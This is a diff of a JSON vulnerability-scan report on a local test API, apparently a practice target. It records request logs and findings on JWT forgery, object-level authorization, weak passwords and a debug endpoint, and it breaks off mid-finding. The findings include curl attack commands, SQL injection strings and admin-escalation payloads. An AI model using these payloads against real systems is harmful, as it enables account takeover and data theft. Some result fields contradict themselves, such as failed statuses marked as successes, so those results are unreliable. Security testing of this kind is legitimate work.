@@ -2,34 +2,59 @@
   "assessment": {
     "audit_events": [
       {
-        "duration_ms": 17.74,
+        "duration_ms": 11.15,
         "error": null,
         "header_keys": [],
         "method": "POST",
         "path": "/users/v1/register",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:28.828542+00:00"
+        "timestamp": "2026-08-31T12:07:18.761691+00:00"
       },
       {
-        "duration_ms": 5.97,
+        "duration_ms": 6.25,
         "error": null,
         "header_keys": [],
         "method": "POST",
         "path": "/users/v1/login",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:28.834537+00:00"
+        "timestamp": "2026-08-31T12:07:18.767966+00:00"
       },
       {
-        "duration_ms": 7.39,
+        "duration_ms": 4.8,
+        "error": null,
+        "header_keys": [
+          "Authorization",
+          "x-access-token"
+        ],
+        "method": "GET",
+        "path": "/me",
+        "status_code": 401,
+        "timestamp": "2026-08-31T12:07:18.773198+00:00"
+      },
+      {
+        "duration_ms": 8.93,
         "error": null,
         "header_keys": [],
         "method": "POST",
         "path": "/users/v1/register",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:28.842082+00:00"
+        "timestamp": "2026-08-31T12:07:18.782178+00:00"
       },
       {
-        "duration_ms": 4.04,
+        "duration_ms": 7.47,
+        "error": null,
+        "header_keys": [
+          "Authorization",
+          "X-Access-Token",
+          "x-access-token"
+        ],
+        "method": "PUT",
+        "path": "/users/v1/copilot_8e330647/password",
+        "status_code": 204,
+        "timestamp": "2026-08-31T12:07:18.789688+00:00"
+      },
+      {
+        "duration_ms": 3.4,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -39,10 +64,10 @@
         "method": "GET",
         "path": "/users/v1",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:28.846158+00:00"
+        "timestamp": "2026-08-31T12:07:18.793136+00:00"
       },
       {
-        "duration_ms": 3.7,
+        "duration_ms": 3.49,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -52,10 +77,10 @@
         "method": "GET",
         "path": "/users/v1/_debug",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:28.849932+00:00"
+        "timestamp": "2026-08-31T12:07:18.796683+00:00"
       },
       {
-        "duration_ms": 3.0,
+        "duration_ms": 3.53,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -63,38 +88,12 @@
           "x-access-token"
         ],
         "method": "GET",
-        "path": "/users/v1/1",
-        "status_code": 404,
-        "timestamp": "2026-08-03T06:12:28.853010+00:00"
+        "path": "/users/v1/name1",
+        "status_code": 200,
+        "timestamp": "2026-08-31T12:07:18.800293+00:00"
       },
       {
-        "duration_ms": 2.97,
-        "error": null,
-        "header_keys": [
-          "Authorization",
-          "X-Access-Token",
-          "x-access-token"
-        ],
-        "method": "GET",
-        "path": "/users/v1/2",
-        "status_code": 404,
-        "timestamp": "2026-08-03T06:12:28.856001+00:00"
-      },
-      {
-        "duration_ms": 3.2,
-        "error": null,
-        "header_keys": [
-          "Authorization",
-          "X-Access-Token",
-          "x-access-token"
-        ],
-        "method": "GET",
-        "path": "/users/v1/3",
-        "status_code": 404,
-        "timestamp": "2026-08-03T06:12:28.859223+00:00"
-      },
-      {
-        "duration_ms": 4.17,
+        "duration_ms": 3.84,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -104,10 +103,10 @@
         "method": "POST",
         "path": "/books/v1",
         "status_code": 400,
-        "timestamp": "2026-08-03T06:12:28.863430+00:00"
+        "timestamp": "2026-08-31T12:07:18.804195+00:00"
       },
       {
-        "duration_ms": 4.67,
+        "duration_ms": 4.49,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -115,12 +114,12 @@
           "x-access-token"
         ],
         "method": "PUT",
-        "path": "/users/v1/1/email",
+        "path": "/users/v1/copilot_8e330647/email",
         "status_code": 400,
-        "timestamp": "2026-08-03T06:12:28.868137+00:00"
+        "timestamp": "2026-08-31T12:07:18.808716+00:00"
       },
       {
-        "duration_ms": 4.24,
+        "duration_ms": 4.62,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -128,12 +127,12 @@
           "x-access-token"
         ],
         "method": "PUT",
-        "path": "/users/v1/1/email",
+        "path": "/users/v1/copilot_8e330647/email",
         "status_code": 400,
-        "timestamp": "2026-08-03T06:12:28.872403+00:00"
+        "timestamp": "2026-08-31T12:07:18.813359+00:00"
       },
       {
-        "duration_ms": 3.89,
+        "duration_ms": 4.4,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -141,12 +140,12 @@
           "x-access-token"
         ],
         "method": "PUT",
-        "path": "/users/v1/1/email",
+        "path": "/users/v1/copilot_8e330647/email",
         "status_code": 400,
-        "timestamp": "2026-08-03T06:12:28.876320+00:00"
+        "timestamp": "2026-08-31T12:07:18.817788+00:00"
       },
       {
-        "duration_ms": 5.32,
+        "duration_ms": 4.71,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -154,12 +153,12 @@
           "x-access-token"
         ],
         "method": "PUT",
-        "path": "/users/v1/1/email",
+        "path": "/users/v1/copilot_8e330647/email",
         "status_code": 400,
-        "timestamp": "2026-08-03T06:12:28.881664+00:00"
+        "timestamp": "2026-08-31T12:07:18.822529+00:00"
       },
       {
-        "duration_ms": 4.77,
+        "duration_ms": 4.58,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -167,12 +166,12 @@
           "x-access-token"
         ],
         "method": "PUT",
-        "path": "/users/v1/1/email",
+        "path": "/users/v1/copilot_8e330647/email",
         "status_code": 400,
-        "timestamp": "2026-08-03T06:12:28.886461+00:00"
+        "timestamp": "2026-08-31T12:07:18.827148+00:00"
       },
       {
-        "duration_ms": 4.32,
+        "duration_ms": 5.0,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -180,12 +179,12 @@
           "x-access-token"
         ],
         "method": "PUT",
-        "path": "/users/v1/1/email",
+        "path": "/users/v1/copilot_8e330647/email",
         "status_code": 400,
-        "timestamp": "2026-08-03T06:12:28.890805+00:00"
+        "timestamp": "2026-08-31T12:07:18.832173+00:00"
       },
       {
-        "duration_ms": 4.38,
+        "duration_ms": 4.91,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -193,21 +192,81 @@
           "x-access-token"
         ],
         "method": "PUT",
-        "path": "/users/v1/1/email",
+        "path": "/users/v1/copilot_8e330647/email",
         "status_code": 400,
-        "timestamp": "2026-08-03T06:12:28.895216+00:00"
+        "timestamp": "2026-08-31T12:07:18.837119+00:00"
       },
       {
-        "duration_ms": 8.16,
+        "duration_ms": 7.05,
+        "error": null,
+        "header_keys": [
+          "Authorization",
+          "X-Access-Token",
+          "x-access-token"
+        ],
+        "method": "PUT",
+        "path": "/users/v1/copilot_8e330647/password",
+        "status_code": 204,
+        "timestamp": "2026-08-31T12:07:18.844214+00:00"
+      },
+      {
+        "duration_ms": 7.01,
+        "error": null,
+        "header_keys": [
+          "Authorization",
+          "X-Access-Token",
+          "x-access-token"
+        ],
+        "method": "PUT",
+        "path": "/users/v1/copilot_8e330647/password",
+        "status_code": 204,
+        "timestamp": "2026-08-31T12:07:18.851248+00:00"
+      },
+      {
+        "duration_ms": 6.82,
+        "error": null,
+        "header_keys": [
+          "Authorization",
+          "X-Access-Token",
+          "x-access-token"
+        ],
+        "method": "PUT",
+        "path": "/users/v1/copilot_8e330647/password",
+        "status_code": 204,
+        "timestamp": "2026-08-31T12:07:18.858089+00:00"
+      },
+      {
+        "duration_ms": 6.57,
         "error": null,
         "header_keys": [],
         "method": "POST",
         "path": "/users/v1/register",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:28.903430+00:00"
+        "timestamp": "2026-08-31T12:07:18.865066+00:00"
       },
       {
-        "duration_ms": 3.21,
+        "duration_ms": 4.15,
+        "error": null,
+        "header_keys": [],
+        "method": "POST",
+        "path": "/users/v1/login",
+        "status_code": 200,
+        "timestamp": "2026-08-31T12:07:18.869248+00:00"
+      },
+      {
+        "duration_ms": 2.78,
+        "error": null,
+        "header_keys": [
+          "Authorization",
+          "x-access-token"
+        ],
+        "method": "GET",
+        "path": "/me",
+        "status_code": 200,
+        "timestamp": "2026-08-31T12:07:18.872053+00:00"
+      },
+      {
+        "duration_ms": 2.86,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -217,64 +276,64 @@
         "method": "GET",
         "path": "/users/v1",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:28.906674+00:00"
+        "timestamp": "2026-08-31T12:07:18.874954+00:00"
       },
       {
-        "duration_ms": 2.61,
+        "duration_ms": 2.53,
         "error": null,
         "header_keys": [],
         "method": "GET",
         "path": "/api/v1/users",
         "status_code": 404,
-        "timestamp": "2026-08-03T06:12:28.909309+00:00"
+        "timestamp": "2026-08-31T12:07:18.877508+00:00"
       },
       {
-        "duration_ms": 3.04,
+        "duration_ms": 2.43,
         "error": null,
         "header_keys": [],
         "method": "GET",
         "path": "/api/v1/books",
         "status_code": 404,
-        "timestamp": "2026-08-03T06:12:28.912364+00:00"
+        "timestamp": "2026-08-31T12:07:18.879947+00:00"
       },
       {
-        "duration_ms": 3.08,
+        "duration_ms": 2.32,
         "error": null,
         "header_keys": [],
         "method": "GET",
         "path": "/users/v2",
         "status_code": 404,
-        "timestamp": "2026-08-03T06:12:28.915467+00:00"
+        "timestamp": "2026-08-31T12:07:18.882284+00:00"
       },
       {
-        "duration_ms": 2.67,
+        "duration_ms": 3.03,
         "error": null,
         "header_keys": [],
         "method": "GET",
         "path": "/books/v2",
         "status_code": 404,
-        "timestamp": "2026-08-03T06:12:28.918154+00:00"
+        "timestamp": "2026-08-31T12:07:18.885327+00:00"
       },
       {
-        "duration_ms": 2.67,
+        "duration_ms": 2.38,
         "error": null,
         "header_keys": [],
         "method": "GET",
         "path": "/v2/users/v1",
         "status_code": 404,
-        "timestamp": "2026-08-03T06:12:28.920837+00:00"
+        "timestamp": "2026-08-31T12:07:18.887722+00:00"
       },
       {
-        "duration_ms": 6.27,
+        "duration_ms": 2.49,
         "error": null,
         "header_keys": [],
         "method": "GET",
         "path": "/v2/books/v1",
         "status_code": 404,
-        "timestamp": "2026-08-03T06:12:28.927126+00:00"
+        "timestamp": "2026-08-31T12:07:18.890230+00:00"
       },
       {
-        "duration_ms": 20.74,
+        "duration_ms": 18.61,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -284,40 +343,41 @@
         "method": "GET",
         "path": "/createdb",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:28.947898+00:00"
+        "timestamp": "2026-08-31T12:07:18.908860+00:00"
       },
       {
-        "duration_ms": 4.53,
+        "duration_ms": 3.7,
         "error": null,
         "header_keys": [],
         "method": "GET",
         "path": "/books/v1",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:28.952463+00:00"
+        "timestamp": "2026-08-31T12:07:18.912593+00:00"
       },
       {
-        "duration_ms": 2.87,
+        "duration_ms": 2.6,
         "error": null,
         "header_keys": [],
         "method": "GET",
-        "path": "/users/v1/1",
+        "path": "/users/v1/copilot_8e330647",
         "status_code": 404,
-        "timestamp": "2026-08-03T06:12:28.955383+00:00"
+        "timestamp": "2026-08-31T12:07:18.915225+00:00"
       },
       {
-        "duration_ms": 2.91,
+        "duration_ms": 5.46,
         "error": null,
         "header_keys": [
           "Authorization",
+          "X-Access-Token",
           "x-access-token"
         ],
-        "method": "GET",
-        "path": "/users/v1/1",
-        "status_code": 404,
-        "timestamp": "2026-08-03T06:12:28.958312+00:00"
+        "method": "PUT",
+        "path": "/users/v1/name1/password",
+        "status_code": 204,
+        "timestamp": "2026-08-31T12:07:18.920705+00:00"
       },
       {
-        "duration_ms": 7.08,
+        "duration_ms": 5.19,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -325,12 +385,12 @@
           "x-access-token"
         ],
         "method": "DELETE",
-        "path": "/users/v1/1",
+        "path": "/users/v1/name1",
         "status_code": 500,
-        "timestamp": "2026-08-03T06:12:28.965426+00:00"
+        "timestamp": "2026-08-31T12:07:18.925929+00:00"
       },
       {
-        "duration_ms": 4.33,
+        "duration_ms": 2.97,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -338,12 +398,12 @@
           "x-access-token"
         ],
         "method": "PUT",
-        "path": "/users/v1/1/password",
+        "path": "/users/v1/copilot_8e330647/password",
         "status_code": 400,
-        "timestamp": "2026-08-03T06:12:28.969789+00:00"
+        "timestamp": "2026-08-31T12:07:18.928926+00:00"
       },
       {
-        "duration_ms": 3.01,
+        "duration_ms": 2.64,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -351,12 +411,12 @@
           "x-access-token"
         ],
         "method": "PUT",
-        "path": "/users/v1/1/password",
+        "path": "/users/v1/copilot_8e330647/password",
         "status_code": 400,
-        "timestamp": "2026-08-03T06:12:28.972823+00:00"
+        "timestamp": "2026-08-31T12:07:18.931581+00:00"
       },
       {
-        "duration_ms": 3.56,
+        "duration_ms": 3.21,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -364,12 +424,12 @@
           "x-access-token"
         ],
         "method": "PUT",
-        "path": "/users/v1/1/password",
+        "path": "/users/v1/copilot_8e330647/password",
         "status_code": 400,
-        "timestamp": "2026-08-03T06:12:28.976407+00:00"
+        "timestamp": "2026-08-31T12:07:18.934814+00:00"
       },
       {
-        "duration_ms": 5.16,
+        "duration_ms": 3.48,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -379,10 +439,10 @@
         "method": "GET",
         "path": "/books/v1",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:28.981592+00:00"
+        "timestamp": "2026-08-31T12:07:18.938325+00:00"
       },
       {
-        "duration_ms": 4.26,
+        "duration_ms": 3.1,
         "error": null,
         "header_keys": [
           "Authorization",
@@ -390,73 +450,129 @@
           "x-access-token"
         ],
         "method": "GET",
-        "path": "/books/v1/bookTitle3",
+        "path": "/books/v1/bookTitle62",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:28.985895+00:00"
+        "timestamp": "2026-08-31T12:07:18.941457+00:00"
       },
       {
-        "duration_ms": 4.07,
+        "duration_ms": 3.58,
         "error": null,
         "header_keys": [],
         "method": "POST",
         "path": "/users/v1/login",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:28.990002+00:00"
+        "timestamp": "2026-08-31T12:07:18.945061+00:00"
       },
       {
-        "duration_ms": 7.34,
+        "duration_ms": 9.89,
         "error": null,
         "header_keys": [],
         "method": "POST",
         "path": "/users/v1/login",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:29.102403+00:00"
+        "timestamp": "2026-08-31T12:07:19.060036+00:00"
       },
       {
-        "duration_ms": 14.95,
+        "duration_ms": 13.4,
         "error": null,
         "header_keys": [],
         "method": "POST",
         "path": "/users/v1/login",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:29.222465+00:00"
+        "timestamp": "2026-08-31T12:07:19.177882+00:00"
       },
       {
-        "duration_ms": 15.02,
+        "duration_ms": 20.34,
         "error": null,
         "header_keys": [],
         "method": "POST",
         "path": "/users/v1/login",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:29.338571+00:00"
+        "timestamp": "2026-08-31T12:07:19.302892+00:00"
       },
       {
-        "duration_ms": 23.18,
+        "duration_ms": 15.05,
         "error": null,
         "header_keys": [],
         "method": "POST",
         "path": "/users/v1/login",
         "status_code": 200,
-        "timestamp": "2026-08-03T06:12:29.465671+00:00"
+        "timestamp": "2026-08-31T12:07:19.418993+00:00"
       }
     ],
     "auth_context": {
       "token_present": true,
       "user_id": null,
-      "username": "copilot_4cc4df1a"
+      "username": "copilot_8e330647"
     },
     "base_url": "http://localhost:5000",
     "findings": [
+      {
+        "cvss_score": 9.2,
+        "endpoint": "/users/v1/login",
+        "evidence": {
+          "exploit_command": "curl -i -X POST 'http://localhost:5000/users/v1/login' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'Content-Type: application/json' -d '{\"username\":\"demo\",\"password\":\"12345\"}'",
+          "message": "Token successfully re-signed with common weak secrets",
+          "poc_results": {
+            "sample_payloads": [
+              {
+                "payload": "{\"test\": \"empty secret decode\"}",
+                "status": 200,
+                "success": true
+              },
+              {
+                "payload": "{\"test\": \"common weak secret\"}",
+                "status": 200,
+                "success": true
+              },
+              {
+                "payload": "{\"test\": \"algorithm confusion\"}",
+                "status": 200,
+                "success": true
+              }
+            ],
+            "successful": 6,
+            "total_attempts": 6
+          }
+        },
+        "method": "POST",
+        "owasp_category": "API2: Broken Authentication",
+        "proof_of_concept": "Attempt to re-sign JWT with weak secrets like 'secret', 'password', or key derivable from public info.",
+        "remediation": "Use cryptographically strong secrets for HMAC signing and consider asymmetric algorithms like RS256.",
+        "severity": "critical",
+        "title": "JWT can be forged with weak secrets"
+      },
       {
         "cvss_score": 3.9,
         "endpoint": "/users/v1/login",
         "evidence": {
           "claims": {
-            "exp": 1785737608,
-            "iat": 1785737548,
-            "sub": "copilot_4cc4df1a"
+            "exp": 1788178098,
+            "iat": 1788178038,
+            "sub": "copilot_8e330647"
           },
-          "exploit_command": "curl -i -X POST 'http://localhost:5000/users/v1/login' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'Content-Type: application/json' -d '{\"username\":\"demo\",\"password\":\"12345\"}'"
+          "exploit_command": "curl -i -X POST 'http://localhost:5000/users/v1/login' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'Content-Type: application/json' -d '{\"username\":\"demo\",\"password\":\"12345\"}'",
+          "poc_results": {
+            "sample_payloads": [
+              {
+                "payload": "{\"test\": \"empty secret decode\"}",
+                "status": 200,
+                "success": true
+              },
+              {
+                "payload": "{\"test\": \"common weak secret\"}",
+                "status": 200,
+                "success": true
+              },
+              {
+                "payload": "{\"test\": \"algorithm confusion\"}",
+                "status": 200,
+                "success": true
+              }
+            ],
+            "successful": 6,
+            "total_attempts": 6
+          }
         },
         "method": "POST",
         "owasp_category": "API2: Broken Authentication",
@@ -469,7 +585,28 @@
         "cvss_score": 7.7,
         "endpoint": "/users/v1/register",
         "evidence": {
-          "exploit_command": "curl -i -X POST 'http://localhost:5000/users/v1/register' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ'",
+          "exploit_command": "curl -i -X POST 'http://localhost:5000/users/v1/register' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U'",
+          "poc_results": {
+            "sample_payloads": [
+              {
+                "payload": "{\"admin\": true, \"username\": \"hacker\", \"password\": \"hack123\"}",
+                "status": 400,
+                "success": false
+              },
+              {
+                "payload": "{\"role\": \"admin\", \"username\": \"pwned\", \"password\": \"pwned\"}",
+                "status": 400,
+                "success": false
+              },
+              {
+                "payload": "{\"is_admin\": true, \"username\": \"hijack\", \"password\": \"hijack\"}",
+                "status": 400,
+                "success": false
+              }
+            ],
+            "successful": 0,
+            "total_attempts": 3
+          },
           "status": 200,
           "weak_password": "12345"
         },
@@ -481,10 +618,48 @@
         "title": "Weak password accepted during registration"
       },
       {
+        "cvss_score": 7.5,
+        "endpoint": "/users/v1/{username}/password",
+        "evidence": {
+          "exploit_command": "curl -i -X PUT 'http://localhost:5000/users/v1/{username}/password' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U'",
+          "payload": {
+            "password": "12345"
+          },
+          "poc_results": {
+            "sample_payloads": [
+              {
+                "payload": "' OR '1'='1",
+                "status": 400,
+                "success": true
+              },
+              {
+                "payload": "admin' --",
+                "status": 400,
+                "success": true
+              },
+              {
+                "payload": "' UNION SELECT username, password FROM users --",
+                "status": 400,
+                "success": true
+              }
+            ],
+            "successful": 4,
+            "total_attempts": 4
+          },
+          "status": 204
+        },
+        "method": "PUT",
+        "owasp_category": "API2: Broken Authentication",
+        "proof_of_concept": "PUT /users/v1/copilot_8e330647/password with weak password data.",
+        "remediation": "Reject weak passwords during password change and enforce strong password policy consistently.",
+        "severity": "high",
+        "title": "Weak password accepted in password update endpoint"
+      },
+      {
         "cvss_score": 9.0,
         "endpoint": "/users/v1/_debug",
         "evidence": {
-          "exploit_command": "curl -i -X GET 'http://localhost:5000/users/v1/_debug' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODU3Mzc2MDgsImlhdCI6MTc4NTczNzU0OCwic3ViIjoiY29waWxvdF80Y2M0ZGYxYSJ9.0S4sWbh9tWyPRO6OpJhsVmoe1WTNWPlcmGALOuoHmUQ'",
+          "exploit_command": "curl -i -X GET 'http://localhost:5000/users/v1/_debug' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U'",
           "sensitive_fields": [
             "admin",
             "password"
@@ -499,10 +674,120 @@
         "title": "Debug endpoint exposes sensitive user data"
       },
       {
+        "cvss_score": 9.1,
+        "endpoint": "/users/v1/{username}",
+        "evidence": {
+          "exploit_command": "curl -i -X GET 'http://localhost:5000/users/v1/{username}' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U' -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODgxNzgwOTgsImlhdCI6MTc4ODE3ODAzOCwic3ViIjoiY29waWxvdF84ZTMzMDY0NyJ9.F_yTzSSejF9v_CXZINOlLzINRjDqPYzgSCPxPM2PX5U'",
+          "response": {
+            "email": "mail1@mail.com",
+            "username": "name1"
+          },
+          "status": 200,
+          "target_username": "name1"
+        },
+        "method": "GET",
+        "owasp_category": "API1: Broken Object Level Authorization",
+        "proof_of_concept": "GET /users/v1/name1 with a different authenticated user and compare the response.",
+        "remediation": "Enforce per-object authorization checks before returning user records.",
+        "severity": "critical",
+        "title": "Broken object level authorization on user detail endpoint"
+      },
+      {
+        "cvss_score": 8.1,
+        "endpoint": "/users/v1/{username}/password",
+        "evidence": {
